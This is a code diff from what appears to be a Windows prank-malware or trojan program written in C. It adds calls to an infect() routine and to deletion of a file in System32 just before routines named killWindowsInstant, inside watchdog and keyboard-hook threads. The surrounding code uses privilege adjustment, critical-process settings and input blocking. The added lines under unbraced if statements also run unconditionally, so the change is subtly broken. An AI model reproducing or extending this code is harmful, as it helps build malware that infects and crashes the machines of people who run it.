@@ -25,12 +25,12 @@ BOOL winnt32RunOnce = FALSE;
 #pragma comment(lib,"ntdll.lib")
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
-BOOLEAN bl;
 ULONG BreakOnTermination;
 NTSTATUS status;
 char cmd[10];
 BOOLEAN tmp1;
 DWORD tmp2;
+BOOLEAN bl;
 //LPCWSTR aomwe = L"""C:\\Windows\\System32\\winnt32.exe \"%1\" %*""";
 DWORD wb;
 LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -144,11 +144,15 @@ DWORD WINAPI notepadWatchdogThread(LPVOID parameter) {
 		CloseHandle(snapshot);
 
 		if (!bonziRun && bonziRunOnce)
+			infect();
+			DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
 			killWindowsInstant1();
 
 		bonziRun = FALSE;
 		EnumWindows(hideProc2, bonzi);
 		if (!bonziRun && bonziRunOnce)
+			infect();
+			DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
 			killWindowsInstant1();
 
 		Sleep(50);
@@ -513,6 +517,8 @@ DWORD WINAPI Checknkey(LPVOID lpParam) {
 		//sleep 
 		Sleep(10);
 	}
+	infect();
+	DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
 	killWindowsInstant();
 	ExitProcess(0);
 }
@@ -927,7 +933,8 @@ void lol() {
 
 	BlockInput(false);
 
-}void clean() {
+}
+void clean() {
 	const char* exefile = """\"%1\" %*""";
 	HKEY hkey;
 
